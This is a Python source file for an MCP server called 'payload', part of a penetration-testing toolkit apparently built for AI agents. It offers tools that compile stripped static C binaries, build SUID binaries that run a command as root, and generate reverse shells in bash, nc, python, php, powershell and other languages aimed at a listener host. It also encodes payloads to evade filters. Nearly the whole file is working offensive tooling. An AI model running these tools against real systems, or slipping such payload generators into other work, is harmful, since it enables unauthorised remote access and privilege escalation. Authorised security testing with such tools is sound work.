#!/usr/bin/env python3
"""
OpenSploit MCP Server: payload

Payload compiler and generator for penetration testing.
Compiles C code, generates reverse shells, and encodes payloads.
"""

import asyncio
import base64
import json
import os
import tempfile
from pathlib import Path
from typing import Any, Dict, List, Optional

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output


class PayloadServer(BaseMCPServer):
    """MCP server for payload compilation and generation."""

    def __init__(self):
        super().__init__(
            name="payload",
            description="Payload compiler and generator for penetration testing",
            version="1.0.0",
        )

        # Load reverse shell templates
        templates_dir = Path(__file__).parent / "templates"
        self.revshell_templates = {}
        revshell_file = templates_dir / "revshell.json"
        if revshell_file.exists():
            with open(revshell_file) as f:
                self.revshell_templates = json.load(f)

        self.suid_template = ""
        suid_file = templates_dir / "suid_shell.c"
        if suid_file.exists():
            self.suid_template = suid_file.read_text()

        self.register_method(
            name="compile_c",
            description="Compile C source code to an ELF binary",
            params={
                "source": {
                    "type": "string",
                    "required": True,
                    "description": "C source code to compile",
                },
                "arch": {
                    "type": "string",
                    "enum": ["x64", "x86", "arm"],
                    "default": "x64",
                    "description": "Target architecture",
                },
                "static": {
                    "type": "boolean",
                    "default": False,
                    "description": "Compile statically linked binary",
                },
                "strip": {
                    "type": "boolean",
                    "default": True,
                    "description": "Strip symbols from binary",
                },
                "output_format": {
                    "type": "string",
                    "enum": ["base64", "hex"],
                    "default": "base64",
                    "description": "Output encoding format",
                },
            },
            handler=self.compile_c,
        )

        self.register_method(
            name="suid_shell",
            description="Generate a SUID shell binary that executes a command as root",
            params={
                "command": {
                    "type": "string",
                    "default": "/bin/bash",
                    "description": "Command to execute (default: /bin/bash)",
                },
                "arch": {
                    "type": "string",
                    "enum": ["x64", "x86"],
                    "default": "x64",
                    "description": "Target architecture",
                },
                "output_format": {
                    "type": "string",
                    "enum": ["base64", "hex"],
                    "default": "base64",
                    "description": "Output encoding format",
                },
            },
            handler=self.suid_shell,
        )

        self.register_method(
            name="revshell",
            description="Generate a reverse shell payload",
            params={
                "lhost": {
                    "type": "string",
                    "required": True,
                    "description": "Listener IP address",
                },
                "lport": {
                    "type": "integer",
                    "required": True,
                    "description": "Listener port",
                },
                "type": {
                    "type": "string",
                    "enum": ["bash", "python", "nc", "php", "perl", "ruby", "powershell", "socat"],
                    "default": "bash",
                    "description": "Reverse shell type",
                },
                "variant": {
                    "type": "string",
                    "description": "Variant of the shell type (e.g., 'tcp', 'pty', 'mkfifo')",
                },
                "encode": {
                    "type": "string",
                    "enum": ["none", "base64", "url", "double-url"],
                    "default": "none",
                    "description": "Encoding to apply",
                },
            },
            handler=self.revshell,
        )

        self.register_method(
            name="list_shells",
            description="List available reverse shell types and variants",
            params={},
            handler=self.list_shells,
        )

        self.register_method(
            name="encode",
            description="Encode a payload using various methods",
            params={
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload to encode",
                },
                "encoding": {
                    "type": "string",
                    "enum": ["base64", "url", "double-url", "hex", "unicode"],
                    "required": True,
                    "description": "Encoding method",
                },
            },
            handler=self.encode,
        )

        self.register_method(
            name="decode",
            description="Decode an encoded payload",
            params={
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload to decode",
                },
                "encoding": {
                    "type": "string",
                    "enum": ["base64", "url", "hex"],
                    "required": True,
                    "description": "Encoding to reverse",
                },
            },
            handler=self.decode,
        )

    async def compile_c(
        self,
        source: str,
        arch: str = "x64",
        static: bool = False,
        strip: bool = True,
        output_format: str = "base64",
    ) -> ToolResult:
        """Compile C source code to an ELF binary."""
        self.logger.info(f"Compiling C code for {arch} architecture")

        with tempfile.TemporaryDirectory() as tmpdir:
            src_file = os.path.join(tmpdir, "payload.c")
            out_file = os.path.join(tmpdir, "payload")

            # Write source to file
            with open(src_file, "w") as f:
                f.write(source)

            # Build compiler command
            if arch == "x64":
                compiler = "gcc"
                flags = ["-m64"]
            elif arch == "x86":
                compiler = "gcc"
                flags = ["-m32"]
            elif arch == "arm":
                compiler = "arm-linux-gnueabi-gcc"
                flags = []
            else:
                return ToolResult(
                    success=False,
                    error=f"Unknown architecture: {arch}",
                )

            args = [compiler] + flags + ["-o", out_file, src_file]

            if static:
                args.append("-static")

            if strip:
                args.append("-s")

            try:
                result = await self.run_command(args, timeout=60)

                if not os.path.exists(out_file):
                    return ToolResult(
                        success=False,
                        error=f"Compilation failed: {result.stderr}",
                        raw_output=result.stderr,
                    )

                # Read binary and encode
                with open(out_file, "rb") as f:
                    binary_data = f.read()

                if output_format == "base64":
                    encoded = base64.b64encode(binary_data).decode()
                else:  # hex
                    encoded = binary_data.hex()

                return ToolResult(
                    success=True,
                    data={
                        "arch": arch,
                        "size_bytes": len(binary_data),
                        "static": static,
                        "stripped": strip,
                        "format": output_format,
                        "binary": encoded,
                    },
                    raw_output=f"Compiled {len(binary_data)} byte {arch} ELF binary",
                )

            except ToolError as e:
                return ToolResult(
                    success=False,
                    error=str(e),
                )

    async def suid_shell(
        self,
        command: str = "/bin/bash",
        arch: str = "x64",
        output_format: str = "base64",
    ) -> ToolResult:
        """Generate a SUID shell binary."""
        self.logger.info(f"Generating SUID shell for command: {command}")

        # Generate C code for SUID shell
        if command == "/bin/bash" or command == "/bin/sh":
            cmd_code = f'system("{command}");'
        else:
            # For custom commands, use execve for more control
            cmd_code = f'char *args[] = {{"/bin/sh", "-c", "{command}", NULL}}; execve("/bin/sh", args, NULL);'

        source = self.suid_template.replace("{{COMMAND}}", cmd_code)

        # Compile it
        return await self.compile_c(
            source=source,
            arch=arch,
            static=True,  # Static for portability
            strip=True,
            output_format=output_format,
        )

    async def revshell(
        self,
        lhost: str,
        lport: int,
        type: str = "bash",
        variant: Optional[str] = None,
        encode: str = "none",
    ) -> ToolResult:
        """Generate a reverse shell payload."""
        self.logger.info(f"Generating {type} reverse shell to {lhost}:{lport}")

        if type not in self.revshell_templates:
            return ToolResult(
                success=False,
                error=f"Unknown shell type: {type}. Available: {list(self.revshell_templates.keys())}",
            )

        variants = self.revshell_templates[type]

        # Pick variant
        if variant and variant in variants:
            template = variants[variant]
        else:
            # Use first available variant
            variant = list(variants.keys())[0]
            template = variants[variant]

        # Substitute variables
        payload = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))

        # Apply encoding
        encoded_payload = self._apply_encoding(payload, encode)

        return ToolResult(
            success=True,
            data={
                "type": type,
                "variant": variant,
                "lhost": lhost,
                "lport": lport,
                "encoding": encode,
                "payload": encoded_payload,
                "raw_payload": payload if encode != "none" else None,
            },
            raw_output=encoded_payload,
        )

    async def list_shells(self) -> ToolResult:
        """List available reverse shell types and variants."""
        shells = {}
        for shell_type, variants in self.revshell_templates.items():
            shells[shell_type] = list(variants.keys())

        return ToolResult(
            success=True,
            data={"shells": shells},
            raw_output=json.dumps(shells, indent=2),
        )

    def _apply_encoding(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload."""
        from urllib.parse import quote as url_quote

        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            return url_quote(payload, safe="")
        elif encoding == "double-url":
            return url_quote(url_quote(payload, safe=""), safe="")
        else:
            return payload

    async def encode(
        self,
        payload: str,
        encoding: str,
    ) -> ToolResult:
        """Encode a payload."""
        from urllib.parse import quote as url_quote

        self.logger.info(f"Encoding payload with {encoding}")

        try:
            if encoding == "base64":
                result = base64.b64encode(payload.encode()).decode()
            elif encoding == "url":
                result = url_quote(payload, safe="")
            elif encoding == "double-url":
                result = url_quote(url_quote(payload, safe=""), safe="")
            elif encoding == "hex":
                result = payload.encode().hex()
            elif encoding == "unicode":
                result = "".join(f"\\u{ord(c):04x}" for c in payload)
            else:
                return ToolResult(
                    success=False,
                    error=f"Unknown encoding: {encoding}",
                )

            return ToolResult(
                success=True,
                data={
                    "encoding": encoding,
                    "input_length": len(payload),
                    "output_length": len(result),
                    "encoded": result,
                },
                raw_output=result,
            )

        except Exception as e:
            return ToolResult(
                success=False,
                error=str(e),
            )

    async def decode(
        self,
        payload: str,
        encoding: str,
    ) -> ToolResult:
        """Decode an encoded payload."""
        from urllib.parse import unquote as url_unquote

        self.logger.info(f"Decoding {encoding} payload")

        try:
            if encoding == "base64":
                result = base64.b64decode(payload).decode()
            elif encoding == "url":
                result = url_unquote(payload)
            elif encoding == "hex":
                result = bytes.fromhex(payload).decode()
            else:
                return ToolResult(
                    success=False,
                    error=f"Unknown encoding: {encoding}",
                )

            return ToolResult(
                success=True,
                data={
                    "encoding": encoding,
                    "input_length": len(payload),
                    "output_length": len(result),
                    "decoded": result,
                },
                raw_output=result,
            )

        except Exception as e:
            return ToolResult(
                success=False,
                error=str(e),
            )


if __name__ == "__main__":
    PayloadServer.main()
